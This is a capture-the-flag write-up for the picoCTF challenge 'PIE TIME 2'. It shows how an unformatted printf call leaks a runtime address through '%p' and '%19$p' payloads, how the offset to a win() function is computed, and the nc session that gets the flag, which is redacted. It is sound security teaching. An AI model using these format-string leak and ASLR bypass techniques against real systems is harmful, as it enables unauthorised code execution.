# PIE TIME 2
## Pico CTF -- Medium

For this challenge, we are given the [compiled binary](vuln) as well as the [source code](vuln.c).

This challenge focuses on bypassing ASLR, which will randomize the location in memory from which the binary runs. As a result, the memory addresses themselves will change each time the binary runs, making it more difficult for an attacker to reference any specific address.

Recall, while the memory addresses themselves change, the offset between addresses is constant. Hence, if we find a way to leak a memory address at runtime, we can calculate other sensitive addresses using the fixed offset.

When we run the binary, we are asked for our name, and then asked to supply a memory address.

    └──╼ $./vuln 
    Enter your name:meanderingmoose
    meanderingmoose
    enter the address to jump to, ex => 0x12345: 


Notice, in call_functions(), the program calls printf() with no format specifier.

    void call_functions() {
    char buffer[64];
    printf("Enter your name:");
    fgets(buffer, 64, stdin);
    printf(buffer); // no format specifier

    unsigned long val;
    printf(" enter the address to jump to, ex => 0x12345: ");
    scanf("%lx", &val);

    void (*foo)(void) = (void (*)())val;
    foo();
    }

This is a textbook format strings vulnerability, which will allow us to supply our own format specifier(s) as part of the input.

    └──╼ $./vuln
    Enter your name:%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.
    0x5622d42092a1.0xfbad2288.0x7ffd715d2640.(nil).0x21001.(nil).0x7f95b9448760.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x2e70252e70252e.(nil).0xc8f1b0fa2a11b000.0x7ffd715d26a0.0x5622d1e38441.0x1.0x7f95b929b24a. enter the address to jump to, ex => 0x12345: Segfault Occurred, incorrect address.

By supplying a series of pointer format specifiers, %p, we leak memory addresses from inside the program.

When %p is processed, the program looks at the next slot on the stack (or the next argument register, depending on the architecture), interprets it as a pointer, and then prints it.

If we print enough of these values, eventually one will be useful.

If we repeat this in GDB, we notice that the address of the main() function looks very similar to the 19th pointer value we printed.

    ──────────────────────────────── trace ────
    [#0] 0x55555555531c → call_functions()
    [#1] 0x555555555441 → main()
    ─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
    gef➤  info address win
    Symbol "win" is at 0x55555555536a in a file compiled without debugging.
    gef➤  


Indeed, this 19th pointer value, 0x5622d1e38441, corresponds to the address of main() at runtime, so we can find the address of win() at runtime, by finding the offset between main() and win() and then adding that offset to the value we leak.


main() addr - win() addr gives us an offset of 215 bytes.

    >>> 0x555555555441 - 0x55555555536a
    215

We can easily get the main() addr by entering %19$p (prints 19th pointer value only).

By subtracting 215 from the value returned by the program, have the address of win() at runtime.


    >>> 0x5bead47f5441 - 215
    101064145589098
    >>> hex(101064145589098)
    '0x5bead47f536a'
    >>> 


    └──╼ $nc rescued-float.picoctf.net 60583
    Enter your name:%19$p
    0x5bead47f5441
    enter the address to jump to, ex => 0x12345: 0x5bead47f536a
    You won!
    picoCTF{XXXXXXXXXXXXXXXXXXXXXX}

